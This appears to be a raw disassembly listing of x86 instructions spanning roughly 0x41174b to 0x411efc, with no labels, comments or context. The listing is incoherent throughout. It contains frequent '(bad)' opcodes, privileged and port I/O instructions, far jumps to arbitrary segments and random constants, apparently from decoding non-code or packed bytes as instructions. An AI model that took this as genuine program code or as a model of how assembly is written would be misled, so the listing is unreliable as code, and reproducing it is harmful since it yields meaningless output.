  41174b:	test   eax,0xc0c19b8
  411750:	or     ecx,esp
  411752:	jmp    0x124b:0xb4ea8bfa
  411759:	and    bl,cl
  41175b:	fist   WORD PTR [edi+0x469d0140]
  411761:	shr    DWORD PTR [esi+0x3c],0x2c
  411765:	mov    ds:0x5ae0e0a2,eax
  41176a:	sub    al,0xd5
  41176c:	std    
  41176d:	call   0x8c5d96fa
  411772:	mov    edi,DWORD PTR [edx]
  411774:	jp     0x41173c
  411776:	xor    DWORD PTR [edi-0x70bc1734],0xffffff8d
  41177d:	fdivrp st(5),st
  41177f:	xchg   DWORD PTR [edi],ebp
  411781:	mov    ah,dh
  411783:	dec    edi
  411784:	out    dx,eax
  411785:	dec    esi
  411786:	hlt    
  411787:	(bad)  
  411788:	call   0xeadde4f4
  41178d:	mov    esp,0x4975ef67
  411792:	aaa    
  411793:	pop    ss
  411794:	sbb    eax,0xaf907b39
  411799:	pusha  
  41179a:	add    DWORD PTR [ebx-0x4ffdcc7d],ecx
  4117a0:	jecxz  0x411743
  4117a2:	xor    edx,DWORD PTR [ebx+ebx*4-0x59aa8b41]
  4117a9:	adc    edx,eax
  4117ab:	push   ecx
  4117ac:	cmp    al,BYTE PTR ds:0xdf9dc002
  4117b2:	mov    ebx,0xddc6e921
  4117b7:	fld    TBYTE PTR [esi+0x4a]
  4117ba:	sub    al,0x7
  4117bc:	aas    
  4117bd:	out    0x85,eax
  4117bf:	and    eax,ebx
  4117c1:	loopne 0x4117ac
  4117c3:	push   ecx
  4117c4:	mov    al,0xef
  4117c6:	and    ecx,DWORD PTR [ebp-0x5c0630ff]
  4117cc:	sbb    al,0xdc
  4117ce:	sahf   
  4117cf:	ret    0x83d0
  4117d2:	pop    edi
  4117d3:	fistp  DWORD PTR [eax]
  4117d5:	dec    ebx
  4117d6:	fcomip st,st(3)
  4117d8:	test   eax,0x681d6fc1
  4117dd:	in     al,dx
  4117de:	iret   
  4117df:	mov    ecx,0xa62755
  4117e4:	loopne 0x4117df
  4117e6:	add    BYTE PTR [ebp+0x156c963f],bl
  4117ec:	shl    BYTE PTR [edi],0x7e
  4117ef:	test   al,0x67
  4117f1:	mov    eax,cs
  4117f3:	jmp    0xdf429399
  4117f8:	or     eax,0xbcb70aa6
  4117fd:	inc    DWORD PTR [eax+0x27e3a2c6]
  411803:	pop    es
  411804:	div    DWORD PTR [eax+0xf]
  411807:	add    DWORD PTR [edx],ecx
  411809:	cmp    al,0x3f
  41180b:	push   esi
  41180c:	push   cs
  41180d:	push   eax
  41180e:	pusha  
  41180f:	jo     0x41187a
  411811:	cld    
  411812:	cmp    eax,0x61cf8f0f
  411817:	inc    eax
  411818:	dec    esp
  411819:	test   al,0x20
  41181b:	mov    es,edx
  41181d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41181e:	sbb    BYTE PTR [ebp+ecx*8-0x69eebc9e],ch
  411825:	sbb    esi,ecx
  411827:	pusha  
  411828:	push   es
  411829:	push   0xc007338
  41182e:	add    edx,DWORD PTR [edx+0x313cad01]
  411834:	jbe    0x411825
  411836:	fist   DWORD PTR [edx+0x2be60d42]
  41183c:	push   cs
  41183d:	pop    esi
  41183e:	mov    ch,0x25
  411840:	lods   eax,DWORD PTR ds:[esi]
  411841:	adc    ecx,edi
  411843:	in     eax,dx
  411844:	lds    edi,FWORD PTR [edx-0x39]
  411847:	jge    0x411845
  411849:	(bad)  [ecx]
  41184b:	lahf   
  41184c:	jno    0x411843
  41184e:	test   eax,0xbc96cc2f
  411853:	dec    esi
  411854:	mov    eax,0x93327f3
  411859:	into   
  41185a:	gs stos DWORD PTR es:[edi],eax
  41185c:	shl    DWORD PTR [esp+ebp*2],cl
  41185f:	dec    cl
  411861:	stos   DWORD PTR es:[edi],eax
  411862:	push   ebx
  411863:	cmp    al,0xce
  411865:	aad    0x85
  411867:	xor    edi,0x3d
  41186a:	outs   dx,BYTE PTR ds:[esi]
  41186b:	loopne 0x411876
  41186d:	inc    eax
  41186e:	jmp    DWORD PTR [eax-0x5e027364]
  411874:	pushf  
  411875:	xchg   DWORD PTR [esi],ebx
  411877:	jnp    0x41183a
  411879:	loopne 0x4118f4
  41187b:	add    BYTE PTR [esi-0x18c238fa],al
  411881:	xchg   esi,eax
  411882:	mov    ah,0x1e
  411884:	mov    esi,0x6dbeeeb
  411889:	imul   ecx,edx,0xfffffff0
  41188c:	fs pusha 
  41188e:	adc    ebx,esp
  411890:	dec    esp
  411891:	test   DWORD PTR [edx-0x78bfe8a8],eax
  411897:	pop    esp
  411898:	add    dh,al
  41189a:	mov    ah,0xec
  41189c:	cwde   
  41189d:	aas    
  41189e:	sbb    esp,DWORD PTR [edx+ebx*2]
  4118a1:	rol    DWORD PTR [edx],0x7e
  4118a4:	jns    0x411906
  4118a6:	hlt    
  4118a7:	sbb    BYTE PTR [edx+ebp*1-0x7a],dh
  4118ab:	scas   al,BYTE PTR es:[edi]
  4118ac:	div    DWORD PTR [edx]
  4118ae:	pop    ds
  4118af:	loopne 0x41184a
  4118b1:	jge    0x411900
  4118b3:	push   cs
  4118b4:	jp     0x41185c
  4118b6:	pop    edi
  4118b7:	rcr    DWORD PTR [esi+0x33],0xe7
  4118bb:	jp     0x41186c
  4118bd:	into   
  4118be:	jg     0x41191b
  4118c0:	out    dx,al
  4118c1:	push   ebx
  4118c2:	jmp    0xf1c5:0xf7a0c09f
  4118c9:	aas    
  4118ca:	jnp    0x411921
  4118cc:	retf   0x7473
  4118cf:	jnp    0x4118d5
  4118d1:	sbb    edi,DWORD PTR [ecx]
  4118d3:	add    BYTE PTR [eax],dh
  4118d5:	add    ah,ch
  4118d7:	jge    0x411899
  4118d9:	shr    DWORD PTR [eax],0x88
  4118dc:	lods   eax,DWORD PTR ds:[esi]
  4118dd:	pop    ss
  4118de:	ins    DWORD PTR es:[edi],dx
  4118df:	ficomp DWORD PTR [eax+0x3b01ef7e]
  4118e5:	cmp    al,0x51
  4118e7:	cwde   
  4118e8:	add    ah,al
  4118ea:	jp     0x4118ea
  4118ec:	out    0x6b,al
  4118ee:	push   cs
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	test   bh,bl
  4118f2:	rol    DWORD PTR [ebp-0xc8a5989],0xe3
  4118f9:	lahf   
  4118fa:	repnz mov esp,0x72662c94
  411900:	adc    BYTE PTR [esi+0x14],bl
  411903:	ins    BYTE PTR es:[edi],dx
  411904:	and    DWORD PTR [edi],0x86b92153
  41190a:	gs xor eax,esp
  41190d:	into   
  41190e:	dec    eax
  41190f:	mov    ah,0xe2
  411911:	ins    BYTE PTR es:[edi],dx
  411912:	inc    ebp
  411913:	lods   al,BYTE PTR ds:[esi]
  411914:	push   es
  411915:	js     0x41190d
  411917:	push   esp
  411919:	mov    esi,0x10cac7e7
  41191e:	retf   0x67bd
  411921:	mov    esi,0x7b874670
  411926:	sbb    DWORD PTR [ebx-0x1781fc2d],0xffffffc3
  41192d:	(bad)  
  41192e:	pop    ebp
  41192f:	call   DWORD PTR [edx+0xd3c88fa]
  411935:	dec    esi
  411936:	mov    edi,0x73870846
  41193b:	sbb    al,0x48
  41193d:	out    0x77,eax
  41193f:	fdiv   QWORD PTR [eax+0x77]
  411942:	sub    al,0x7f
  411944:	cld    
  411945:	mov    cl,0x29
  411947:	inc    ecx
  411948:	or     BYTE PTR [eax],dl
  41194a:	fdivr  st,st(4)
  41194c:	lods   eax,DWORD PTR ds:[esi]
  41194d:	pop    ds
  41194e:	daa    
  41194f:	(bad)  
  411950:	iret   
  411951:	cmp    BYTE PTR [ecx+0x47],0x1
  411955:	add    BYTE PTR [eax-0x18bbc8e0],ah
  41195b:	add    BYTE PTR [ecx-0x20],bh
  41195e:	xchg   DWORD PTR [ebx+0x0],eax
  411961:	mov    WORD PTR [eax],?
  411963:	shl    DWORD PTR [edi],1
  411965:	add    DWORD PTR [ecx-0x31],edx
  411968:	xor    DWORD PTR [ecx],eax
  41196a:	add    BYTE PTR [edx-0x24ed4bf1],bh
  411970:	cmp    al,0xf4
  411972:	enter  0x52e3,0x1f
  411976:	dec    ecx
  411977:	call   DWORD PTR [ecx]
  411979:	sti    
  41197a:	dec    edi
  41197b:	inc    edi
  41197c:	stc    
  41197d:	out    0xe0,eax
  41197f:	xor    al,0xd6
  411981:	bndstx [ebx-0x28],(bad)
  411985:	ja     0x4119a5
  411987:	push   es
  411988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411989:	shl    BYTE PTR gs:[ebp+0x6f5815b2],0x50
  411991:	adc    DWORD PTR [esi-0x66],0xffffffef
  411995:	xchg   ebp,eax
  411996:	adc    eax,DWORD PTR [eax]
  411998:	xor    al,0x6
  41199a:	je     0x411a0c
  41199c:	cwde   
  41199d:	push   ecx
  41199e:	lods   al,BYTE PTR ds:[esi]
  41199f:	inc    esi
  4119a0:	(bad)  
  4119a1:	adc    DWORD PTR [edi*1+0x6be0fb0e],edi
  4119a8:	xchg   ebx,eax
  4119a9:	adc    eax,eax
  4119ab:	and    BYTE PTR [ecx+0x129e16dd],dh
  4119b1:	sahf   
  4119b2:	xor    eax,0x35ef6f19
  4119b7:	add    BYTE PTR [eax-0x2c10ff34],0xb6
  4119be:	retf   
  4119bf:	push   ds
  4119c0:	adc    ah,BYTE PTR [ebx]
  4119c2:	push   ss
  4119c3:	and    DWORD PTR [ecx+0xb9f803d],0xffffffe9
  4119ca:	out    dx,eax
  4119cb:	and    BYTE PTR [esp+ebp*8-0x15],bh
  4119cf:	cs mov bl,ch
  4119d2:	mov    edi,0x159181fa
  4119d7:	xor    BYTE PTR [ecx+ecx*1],0x7d
  4119db:	add    BYTE PTR [eax],ah
  4119dd:	dec    edx
  4119de:	jecxz  0x411a01
  4119e0:	or     bl,BYTE PTR [eax]
  4119e2:	xor    esi,DWORD PTR [edx+0x11]
  4119e5:	cmp    BYTE PTR [esi-0x4d90f8e5],ch
  4119eb:	dec    esp
  4119ec:	scas   eax,DWORD PTR es:[edi]
  4119ed:	jp     0x411a60
  4119ef:	ss sahf 
  4119f1:	aad    0xfd
  4119f3:	cmp    BYTE PTR [eax],dl
  4119f5:	add    al,dh
  4119f7:	shl    BYTE PTR [ebp+0x796c797],0xdf
  4119fe:	adc    ecx,DWORD PTR [ebx-0x29]
  411a01:	cmp    al,0x21
  411a03:	out    0xed,al
  411a05:	stc    
  411a06:	gs cli 
  411a08:	jle    0x411a71
  411a0a:	not    esp
  411a0c:	in     al,0xa9
  411a0e:	mov    ecx,0x52293bdf
  411a13:	invd   
  411a15:	pusha  
  411a16:	in     al,dx
  411a17:	fsub   DWORD PTR [esi+0x7abfe8c]
  411a1d:	shr    bh,0x27
  411a20:	mov    ds:0x240939e0,al
  411a25:	ds mov cl,0xb
  411a28:	jb     0x411aa1
  411a2a:	out    0xba,eax
  411a2c:	xchg   esp,eax
  411a2d:	loopne 0x411a32
  411a2f:	cmc    
  411a30:	pop    es
  411a31:	std    
  411a32:	lds    ebx,FWORD PTR [esi-0x13f0dc80]
  411a38:	mov    DWORD PTR [ebp+0x720d5673],edi
  411a3e:	and    DWORD PTR [eax],eax
  411a40:	mov    eax,0x83ff4ea3
  411a45:	cdq    
  411a46:	cmp    eax,0xa4e63de0
  411a4b:	jns    0x411a4d
  411a4d:	push   ebp
  411a4e:	push   es
  411a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a50:	or     DWORD PTR [edx+0x7b],0x164e869
  411a57:	push   0xffffffc8
  411a59:	mov    esi,0xa30aec2e
  411a5e:	mov    edx,0x38699fa0
  411a63:	push   eax
  411a64:	pop    edx
  411a65:	dec    edi
  411a66:	inc    edi
  411a67:	fwait
  411a68:	scas   al,BYTE PTR es:[di]
  411a6a:	pop    ebp
  411a6b:	sbb    ch,cl
  411a6d:	mov    ecx,esi
  411a6f:	dec    ecx
  411a70:	mov    ah,0x17
  411a72:	cmp    ebx,ebx
  411a74:	jo     0x411a5e
  411a76:	(bad)  
  411a77:	std    
  411a78:	pop    ebx
  411a79:	addr16 push 0xffffffc1
  411a7c:	pushf  
  411a7d:	in     al,dx
  411a7e:	dec    cl
  411a80:	xchg   edi,eax
  411a81:	sar    cl,cl
  411a83:	stc    
  411a84:	cmp    BYTE PTR [eax],dh
  411a86:	add    eax,0x1844009
  411a8b:	js     0x411a6d
  411a8d:	or     bh,bl
  411a8f:	in     eax,0xb7
  411a91:	jl     0x411a74
  411a93:	mov    esi,0xcf0e33b4
  411a98:	and    DWORD PTR [eax],0xfda07b9
  411a9e:	sbb    DWORD PTR [esi-0x2d3a9791],esi
  411aa4:	jmp    0x411a54
  411aa6:	dec    esi
  411aa7:	(bad)  
  411aa8:	fld    QWORD PTR [edx]
  411aaa:	add    al,0x40
  411aac:	std    
  411aad:	icebp  
  411aae:	pusha  
  411aaf:	push   ss
  411ab0:	lahf   
  411ab1:	mov    ds:0x40f63898,eax
  411ab6:	ins    BYTE PTR es:[edi],dx
  411ab7:	pop    ecx
  411ab8:	jle    0x411aea
  411aba:	sub    eax,0xd4731f31
  411abf:	cdq    
  411ac0:	or     eax,ebp
  411ac2:	inc    ebx
  411ac3:	cli    
  411ac4:	or     dl,dl
  411ac6:	jge    0x411b14
  411ac8:	aas    
  411ac9:	out    dx,al
  411aca:	lahf   
  411acb:	mov    ch,0x73
  411acd:	dec    esi
  411ace:	sbb    al,0xf8
  411ad0:	loope  0x411ae1
  411ad2:	and    bl,dh
  411ad4:	(bad)  
  411ad5:	test   eax,0x96311a74
  411ada:	call   DWORD PTR [esi+0x20dcfc6f]
  411ae0:	xlat   BYTE PTR ds:[ebx]
  411ae1:	sbb    esp,0x12
  411ae4:	sahf   
  411ae5:	pop    ebx
  411ae6:	inc    ecx
  411ae7:	(bad)  
  411aea:	mov    cl,0xe1
  411aec:	rol    DWORD PTR [ecx],0xfa
  411aef:	pusha  
  411af0:	stos   BYTE PTR es:[edi],al
  411af1:	fcom   st(1)
  411af3:	mov    edi,esp
  411af5:	push   cs
  411af6:	clc    
  411af7:	cmp    BYTE PTR [edi],dh
  411af9:	sub    DWORD PTR [edi+0x402de816],edi
  411aff:	push   ds
  411b00:	into   
  411b01:	or     edi,ebp
  411b03:	dec    ebx
  411b04:	mov    dl,0xec
  411b06:	jmp    0x21c95112
  411b0b:	or     DWORD PTR [edx-0xe],edi
  411b0e:	sbb    ebp,DWORD PTR [esi]
  411b10:	mov    cl,bl
  411b12:	push   ss
  411b13:	lods   eax,DWORD PTR ds:[esi]
  411b14:	(bad)  
  411b15:	mov    bl,0x7b
  411b17:	ins    BYTE PTR es:[edi],dx
  411b18:	add    al,0x4c
  411b1a:	add    al,0x0
  411b1c:	add    BYTE PTR [edi-0x26],0xd7
  411b20:	sahf   
  411b21:	(bad)  
  411b22:	fist   WORD PTR [ebx-0x2]
  411b25:	or     al,0xc9
  411b27:	jae    0x411ba5
  411b29:	mov    esi,0xc8cf29f7
  411b2e:	bound  edi,QWORD PTR [edi+0x4d]
  411b31:	cld    
  411b32:	cli    
  411b33:	sub    ax,0xa52f
  411b37:	std    
  411b38:	sbb    ebx,DWORD PTR ds:0xe59d7b
  411b3e:	sbb    al,0x2d
  411b40:	jl     0x411b04
  411b42:	mov    ch,0x52
  411b44:	pop    ebp
  411b45:	dec    ebx
  411b46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b47:	pop    es
  411b48:	lock push es
  411b4a:	xchg   ebp,eax
  411b4b:	add    eax,0x7b639af0
  411b50:	mov    ah,0x7b
  411b52:	int    0x73
  411b54:	lahf   
  411b55:	pop    ss
  411b56:	dec    ebx
  411b57:	pop    esi
  411b58:	jge    0x411b9b
  411b5a:	xor    cl,BYTE PTR [eax+0x8]
  411b5d:	sbb    al,0x0
  411b5f:	add    BYTE PTR [edi-0x6f42bfc8],0x70
  411b66:	adc    DWORD PTR [ecx+0x18119362],0x40
  411b6d:	add    dl,BYTE PTR [ecx-0x6c36eab]
  411b73:	mov    esi,0x4127e6db
  411b78:	jecxz  0x411bb3
  411b7a:	add    ebx,DWORD PTR [eax]
  411b7c:	cmp    dl,BYTE PTR [edx+0x43aa5867]
  411b82:	sub    al,0x9e
  411b84:	cli    
  411b85:	jb     0x411bda
  411b87:	cmp    ebp,ebp
  411b89:	mov    ah,0xeb
  411b8b:	in     al,dx
  411b8c:	mov    ecx,0x3f27aa3e
  411b91:	jg     0x411b63
  411b93:	jg     0x411bad
  411b95:	adc    DWORD PTR [esi+0x51],esi
  411b98:	sbb    eax,0xbd3eb3d8
  411b9d:	pop    es
  411b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b9f:	(bad)  
  411ba0:	retf   0x5704
  411ba3:	sub    eax,0xa5e93dae
  411ba8:	icebp  
  411ba9:	xor    BYTE PTR [esi+0x76],bh
  411bac:	mov    ebx,0xcbb9f7df
  411bb1:	jnp    0x411b91
  411bb3:	jmp    0x411bec
  411bb5:	pop    edi
  411bb6:	dec    esi
  411bb7:	add    BYTE PTR [eax],al
  411bb9:	dec    edi
  411bba:	push   ecx
  411bbb:	pop    edi
  411bbc:	repz retf 0x4
  411bc0:	pop    eax
  411bc1:	mov    dh,0xbc
  411bc3:	out    dx,eax
  411bc4:	stos   BYTE PTR es:[edi],al
  411bc5:	mul    DWORD PTR [ebp+0x77fbc72d]
  411bcb:	lods   al,BYTE PTR ds:[esi]
  411bcc:	dec    esp
  411bcd:	fimul  WORD PTR [eax]
  411bcf:	pop    esi
  411bd0:	xchg   DWORD PTR [edx-0x78],ecx
  411bd3:	add    dh,BYTE PTR [bx+si+0x17e5]
  411bd8:	rol    BYTE PTR [ebp-0x7446fa70],0x59
  411bdf:	lahf   
  411be0:	js     0x411c31
  411be2:	pop    esp
  411be3:	mov    DWORD PTR [ebx],esi
  411be5:	loopne 0x411b85
  411be7:	aaa    
  411be8:	aas    
  411be9:	push   esi
  411bea:	sbb    al,0x31
  411bec:	jecxz  0x411bff
  411bee:	xchg   esi,eax
  411bef:	dec    edi
  411bf0:	int    0x8e
  411bf2:	cmp    eax,0x81c437eb
  411bf7:	and    ebx,DWORD PTR [ebx-0x17]
  411bfa:	sub    DWORD PTR [ecx],0x7c787d24
  411c00:	adc    al,0x96
  411c02:	mov    dl,0xe0
  411c04:	std    
  411c05:	(bad)
  411c09:	(bad)  
  411c0a:	(bad)  
  411c0b:	(bad)  
  411c0c:	cmp    dh,dh
  411c0e:	dec    DWORD PTR [ebp-0x3]
  411c11:	inc    ebp
  411c12:	fcos   
  411c14:	(bad)  
  411c15:	addr16 (bad) 
  411c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c18:	mov    edi,0xa9fa99de
  411c1d:	sti    
  411c1e:	add    DWORD PTR [esi+eiz*1],esi
  411c21:	in     al,0xdf
  411c23:	inc    esp
  411c24:	in     al,0x89
  411c26:	cmp    al,0xa5
  411c28:	test   BYTE PTR [edx],0xe6
  411c2b:	scas   al,BYTE PTR es:[edi]
  411c2c:	sbb    al,0xba
  411c2e:	and    ah,BYTE PTR [eax+0x79672689]
  411c34:	mov    esi,0xcf8686a1
  411c39:	and    eax,0xf37a23e3
  411c3e:	jl     0x411c02
  411c40:	daa    
  411c41:	dec    edi
  411c42:	dec    ebx
  411c43:	lahf   
  411c44:	ret    
  411c45:	jmp    0x411c4a
  411c47:	or     BYTE PTR [eax-0x74],bh
  411c4a:	xor    eax,0x4b06c97e
  411c4f:	mov    ds:0xee1cec77,al
  411c54:	add    bh,BYTE PTR ds:0x713b8e2
  411c5a:	xadd   DWORD PTR [eax+0x63],esp
  411c5e:	or     al,0x7e
  411c60:	sub    BYTE PTR [esi],al
  411c62:	(bad)  
  411c63:	(bad)  
  411c64:	lea    esi,[edx]
  411c66:	pusha  
  411c67:	add    ecx,DWORD PTR [edi+0x78]
  411c6a:	shl    DWORD PTR [edx+0x76348e04],1
  411c70:	(bad)  
  411c71:	inc    bh
  411c73:	sub    eax,0xeafd2479
  411c78:	xor    al,0x92
  411c7a:	ins    DWORD PTR es:[edi],dx
  411c7b:	js     0x411c4c
  411c7d:	in     eax,dx
  411c7e:	aam    0x8
  411c80:	add    ecx,DWORD PTR [esi]
  411c82:	fdivr  QWORD PTR [edx+0x7b]
  411c85:	bound  eax,QWORD PTR [eax]
  411c87:	cmp    bh,BYTE PTR [esi+0x25367b75]
  411c8d:	popf   
  411c8e:	xor    ecx,0xffffffa3
  411c91:	ins    BYTE PTR es:[edi],dx
  411c92:	jns    0x411c6b
  411c94:	cmp    esp,DWORD PTR [edx-0x3f]
  411c97:	(bad)  
  411c98:	outs   dx,DWORD PTR ds:[esi]
  411c99:	jmp    0x61179693
  411c9e:	jne    0x411cab
  411ca0:	int3   
  411ca1:	lea    ebx,[ecx+0x7c]
  411ca4:	int3   
  411ca5:	and    DWORD PTR [esi-0xc24ee8e],edx
  411cab:	in     al,dx
  411cac:	or     edi,DWORD PTR [edi+eax*4+0xd]
  411cb0:	pop    esi
  411cb1:	fsub   st(4),st
  411cb3:	ret    
  411cb4:	int    0x61
  411cb6:	enter  0xa50f,0x65
  411cba:	int    0xa7
  411cbc:	sahf   
  411cbd:	adc    DWORD PTR [edi-0x7c241704],esi
  411cc3:	pop    esp
  411cc4:	push   eax
  411cc5:	mov    dl,0x99
  411cc7:	fidiv  WORD PTR [ebp+0x17382860]
  411ccd:	add    BYTE PTR [ebx-0x10186d7e],bl
  411cd3:	add    DWORD PTR [edx+0x67],edi
  411cd6:	loope  0x411cb2
  411cd8:	push   0x1d04faf6
  411cdd:	ret    
  411cde:	dec    BYTE PTR [edi]
  411ce0:	cmp    BYTE PTR [ebp+edx*4-0x22d101e5],cl
  411ce7:	or     edi,0x0
  411cea:	push   eax
  411ceb:	fcomip st,st(4)
  411cee:	mov    ecx,0xf16e8a98
  411cf3:	shl    DWORD PTR [esi+0x65],1
  411cf6:	jge    0x411d62
  411cf8:	fwait
  411cf9:	mov    esi,0xdf64b003
  411cfe:	sub    al,0x69
  411d00:	sbb    DWORD PTR [eax+0x69],edx
  411d03:	popf   
  411d04:	and    eax,DWORD PTR [esi+0x9]
  411d07:	or     BYTE PTR [ecx+ebp*2],bh
  411d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d0b:	dec    ecx
  411d0c:	xor    eax,0xf0a3452a
  411d11:	pop    edi
  411d12:	inc    ebx
  411d13:	add    esp,esp
  411d15:	pop    es
  411d16:	rol    BYTE PTR [esi],0x80
  411d19:	(bad)  
  411d1a:	idiv   edi
  411d1c:	out    0x8b,al
  411d1e:	or     DWORD PTR [ebp-0x108154c2],0xffffffad
  411d25:	sub    DWORD PTR [edi-0x40],eax
  411d28:	fadd   QWORD PTR [eax]
  411d2a:	call   0xa6ada61
  411d2f:	mov    dl,0xaf
  411d31:	inc    esp
  411d32:	pop    esi
  411d33:	cmp    al,0x31
  411d35:	pop    es
  411d36:	nop
  411d37:	add    BYTE PTR [eax],ah
  411d39:	mov    al,ds:0x4f0c5320
  411d3e:	mov    cl,BYTE PTR [ebp+0x35]
  411d41:	lock les edi,FWORD PTR [edi+edi*4-0x16d4164b]
  411d49:	push   edi
  411d4a:	test   edx,esp
  411d4c:	out    dx,eax
  411d4d:	mov    esi,0x37e83d
  411d52:	push   es
  411d53:	push   0x1c41b00e
  411d58:	mov    eax,0xea0717bb
  411d5d:	mov    eax,0x9e5fadab
  411d62:	pop    ecx
  411d63:	mov    ecx,0x9b8bce68
  411d68:	das    
  411d69:	jle    0x411de0
  411d6b:	cmp    al,ch
  411d6d:	or     bh,cl
  411d6f:	push   ds
  411d70:	pusha  
  411d71:	lods   eax,DWORD PTR ds:[esi]
  411d72:	lahf   
  411d73:	dec    edi
  411d74:	in     al,dx
  411d75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d76:	inc    esp
  411d77:	pop    ebp
  411d78:	jg     0x411d93
  411d7a:	adc    al,BYTE PTR [eax-0x384d378c]
  411d80:	(bad)  
  411d81:	mov    eax,ds:0x7b4d4eeb
  411d86:	(bad)  
  411d87:	push   ecx
  411d88:	inc    eax
  411d89:	stc    
  411d8a:	add    BYTE PTR [esp+eiz*2+0xe],bl
  411d8e:	xor    al,0x7e
  411d90:	xchg   esp,eax
  411d91:	mov    ebx,0xf4b8fc9e
  411d96:	cmp    DWORD PTR [edx],esi
  411d98:	loop   0x411dc1
  411d9a:	test   DWORD PTR [ebp+eax*4-0x10a766b5],0x5611b2e6
  411da5:	dec    edx
  411da6:	xor    al,0x11
  411da8:	mov    BYTE PTR [ebp+0x3a2c37b4],ch
  411dae:	outs   dx,DWORD PTR ds:[esi]
  411daf:	nop
  411db0:	cmc    
  411db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411db2:	xor    dl,ah
  411db4:	xchg   ecx,eax
  411db5:	daa    
  411db6:	repz sbb dh,dl
  411db9:	pop    ebp
  411dba:	and    eax,0x7d59a573
  411dbf:	std    
  411dc0:	out    dx,eax
  411dc1:	sbb    ecx,DWORD PTR [eax+0x732d4758]
  411dc7:	int3   
  411dc8:	mov    ebp,0x341cce01
  411dcd:	andps  xmm0,xmm5
  411dd0:	jo     0x411e15
  411dd2:	int    0x71
  411dd4:	std    
  411dd5:	clc    
  411dd6:	pop    ds
  411dd7:	(bad)  
  411dd8:	mov    edi,0xd2a3c4f8
  411ddd:	repnz sbb al,0x12
  411de0:	push   0xfffffff8
  411de2:	adc    DWORD PTR [ebx-0x3c],ecx
  411de5:	dec    BYTE PTR [ebx-0x49]
  411de8:	out    dx,al
  411de9:	mov    ebx,DWORD PTR [ebx+0x56]
  411dec:	pop    ds
  411ded:	dec    eax
  411dee:	pop    es
  411def:	imul   ebx,esp,0x5a6f6733
  411df5:	push   ss
  411df6:	in     al,0x93
  411df8:	popf   
  411df9:	pusha  
  411dfa:	add    esp,DWORD PTR [eax+0x1]
  411dfd:	(bad)  
  411dfe:	mov    esi,0x5ac1b0e2
  411e03:	stc    
  411e04:	fsub   QWORD PTR [ebx+0x684b4f8f]
  411e0a:	int3   
  411e0b:	cli    
  411e0c:	ret    
  411e0d:	rol    al,0x94
  411e10:	clc    
  411e11:	adc    BYTE PTR [esi],cl
  411e13:	jae    0x411e44
  411e15:	enter  0xe0d1,0x59
  411e19:	or     bl,BYTE PTR [ecx*8-0x4bd0bc82]
  411e20:	push   ebx
  411e21:	out    dx,eax
  411e22:	pop    edi
  411e23:	cmc    
  411e24:	mov    WORD PTR ds:0xd4e3b28f,cs
  411e2a:	data16 jl 0x411dec
  411e2d:	std    
  411e2e:	stc    
  411e2f:	scas   eax,DWORD PTR es:[edi]
  411e30:	mov    BYTE PTR [ebx+0x25bd999d],al
  411e36:	inc    edi
  411e37:	std    
  411e38:	out    0xc7,al
  411e3a:	add    eax,DWORD PTR [esi+0xa]
  411e3d:	and    eax,DWORD PTR [edi]
  411e3f:	int    0x67
  411e41:	bound  ecx,QWORD PTR [edi]
  411e43:	add    eax,0x42ec7e19
  411e48:	popf   
  411e49:	jnp    0x411e13
  411e4b:	out    0x14,al
  411e4d:	push   cs
  411e4e:	add    BYTE PTR [eax+eax*2],cl
  411e51:	cmc    
  411e52:	jno    0x411e61
  411e54:	cmp    al,0x3d
  411e56:	pop    ds
  411e57:	mov    edi,eax
  411e59:	cld    
  411e5a:	inc    ebx
  411e5b:	daa    
  411e5c:	mov    eax,ds:0x514f08cb
  411e61:	nop
  411e62:	and    esp,edx
  411e64:	mov    al,BYTE PTR [eax]
  411e66:	cmp    al,0x3c
  411e68:	mov    edi,?
  411e6a:	ficomp DWORD PTR [esi+0x480da7f1]
  411e70:	jge    0x411eaf
  411e72:	(bad)  
  411e74:	test   DWORD PTR [edi],esi
  411e76:	(bad)
  411e79:	cld    
  411e7a:	in     al,0x20
  411e7c:	pop    ecx
  411e7d:	(bad)  
  411e7e:	(bad)  
  411e7f:	fnsave [ebx-0x1a]
  411e82:	pop    ds
  411e83:	(bad)  
  411e84:	dec    edi
  411e85:	mov    ebx,0x33f6477b
  411e8a:	lock jg 0x411eaa
  411e8d:	mov    ds:0x3a34f3c5,eax
  411e92:	lahf   
  411e93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e94:	cld    
  411e95:	inc    eax
  411e96:	retf   0x3801
  411e99:	cmp    dl,BYTE PTR [edx+eax*2+0x4661df00]
  411ea0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ea1:	push   eax
  411ea2:	sub    ah,dl
  411ea4:	mov    ecx,0xa04bdd02
  411ea9:	stc    
  411eaa:	add    esi,edi
  411eac:	add    DWORD PTR [esi+edx*1],eax
  411eaf:	mov    esi,0x41e955f6
  411eb4:	pop    es
  411eb5:	ins    BYTE PTR es:[edi],dx
  411eb6:	sbb    al,0x5a
  411eb8:	js     0x411e9e
  411eba:	lahf   
  411ebb:	and    al,0x6f
  411ebd:	(bad)  
  411ebe:	cld    
  411ebf:	add    BYTE PTR [esp+esi*4],cl
  411ec2:	mov    esi,0x678393e4
  411ec7:	lods   al,BYTE PTR ds:[esi]
  411ec8:	adc    ebx,ebp
  411eca:	adc    DWORD PTR [esi],0x23
  411ecd:	add    DWORD PTR [ebx+0x4761ca64],eax
  411ed3:	cmp    al,0x33
  411ed5:	shr    ebp,1
  411ed7:	in     eax,0x47
  411ed9:	fidiv  WORD PTR [ecx]
  411edb:	lock cs int3 
  411ede:	xor    al,0x23
  411ee0:	cmp    ecx,DWORD PTR [edi+0x288f01d0]
  411ee6:	fistp  QWORD PTR [edi-0xf365807]
  411eec:	imul   BYTE PTR [esi-0x440b2403]
  411ef2:	jge    0x411f4c
  411ef4:	mov    esi,0x91e17181
  411ef9:	popa   
  411efa:	add    al,dl
  411efc:	not    BYTE PTR [edi]
